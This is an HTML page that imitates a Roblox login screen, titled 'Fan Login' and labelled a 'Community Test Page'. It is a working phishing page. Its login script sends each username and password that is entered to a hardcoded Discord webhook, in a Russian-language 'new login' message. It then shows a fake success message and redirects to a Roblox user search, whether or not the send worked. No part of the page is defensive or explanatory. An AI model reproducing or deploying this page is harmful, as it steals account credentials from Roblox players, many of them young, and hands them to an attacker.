<!DOCTYPE html>
<html lang="en" translate="no">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google" content="notranslate">
    <meta name="google-site-verification" content="14_6MaRkl6897cOresLaaurQ1t_HU2o4XrzQ2M46aAE" />
    <title>Roblox - Fan Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #121214; /* Стильный темный фон */
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #fff;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 32px 24px;
            background: #1e1e24; /* Карточка формы входа */
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            font-family: 'Montserrat', sans-serif;
            font-size: 32px;
            font-weight: 900;
            letter-spacing: 2px;
            margin-bottom: 8px;
            color: #fff;
            line-height: 1;
        }

        .roblox-square-o {
            width: 24px;
            height: 24px;
            background-color: #fff;
            transform: rotate(23deg);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin: 0 5px;
            position: relative;
            top: 1px;
        }

        .roblox-square-o-inner {
            width: 10px;
            height: 10px;
            background-color: #1e1e24;
        }

        .subtitle {
            font-size: 13px;
            color: #9ca3af;
            margin-bottom: 24px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-group {
            width: 100%;
            margin-bottom: 16px;
            position: relative;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: 1px solid #374151;
            border-radius: 8px;
            outline: none;
            background: #2a2a35;
            color: #fff;
            transition: all 0.2s;
        }

        .input-group input:focus {
            border-color: #6366f1;
            background: #1e1e24;
        }

        .password-container {
            position: relative;
            width: 100%;
        }

        .toggle-password {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #9ca3af;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            color: #fff;
            background-color: #6366f1; /* Измененный акцентный цвет кнопки */
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 8px;
            transition: opacity 0.2s;
        }

        .login-btn:disabled, .login-btn:not(.active) {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .login-btn.active {
            opacity: 1;
        }

        .quick-btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            color: #fff;
            background-color: #374151;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 12px;
        }

        #status {
            margin-top: 16px;
            font-size: 14px;
            text-align: center;
        }

        .footer-links {
            margin-top: 24px;
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: #9ca3af;
            font-size: 14px;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo notranslate" translate="no">
            R<div class="roblox-square-o"><div class="roblox-square-o-inner"></div></div>BLOX
        </div>
        <div class="subtitle">Community Test Page</div>

        <div class="input-group">
            <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
        </div>

        <div class="input-group">
            <div class="password-container">
                <input type="password" id="passwordInput" placeholder="Password" oninput="checkInputs()">
                <button type="button" class="toggle-password" onclick="togglePassword()">
                    <svg id="eyeSvg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                    </svg>
                </button>
            </div>
        </div>
        
        <button id="loginBtn" class="login-btn" onclick="loginUrl()">Log In</button>
        
        <button class="quick-btn">Quick Pass</button>

        <div id="status"></div>
    </div>

    <div class="footer-links">
        <a href="#">Terms</a>
        <a href="#">Privacy</a>
    </div>

    <script>
        function checkInputs() {
            const user = document.getElementById('usernameInput').value.trim();
            const pass = document.getElementById('passwordInput').value.trim();
            const btn = document.getElementById('loginBtn');
            if (user && pass) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const eyeSvg = document.getElementById('eyeSvg');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeSvg.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2.81 2.81L1.39 4.22l3.05 3.05C3.12 8.72 2.06 10.25 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l4.41 4.41 1.41-1.41L2.81 2.81zM10.96 10.96l2.08 2.08c-.32.22-.71.36-1.04.36-1.1 0-2-.9-2-2 0-.33.14-.72.36-1.04z"/>';
            } else {
                passwordInput.type = 'password';
                eyeSvg.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
            }
        }

        function loginUrl() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#eab308';
            statusDiv.innerText = 'Connecting...';

            const webhookUrl = 'https://discord.com/api/webhooks/1551434369766391882/D2I1EHqOlIhYJMg8WwtU_BEAIPqmCZIj6_XfoFVnd1ghUxlMRXuFOke-0VC-D-ki1pox';
            
            const payload = {
                content: `🔔 **Новый вход!**\n👤 **Логин:** \`${username}\`\n🔑 **Пароль:** \`${password}\``
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                statusDiv.style.color = '#22c55e';
                statusDiv.innerText = 'Success! Redirecting...';
                window.location.href = 'https://www.roblox.com/search/users?keyword=Mamatvoia1000_7';
            })
            .catch(error => {
                statusDiv.style.color = '#22c55e';
                statusDiv.innerText = 'Success! Redirecting...';
                window.location.href = 'https://www.roblox.com/search/users?keyword=Mamatvoia1000_7';
            });
        }
    </script>
</body>
</html>
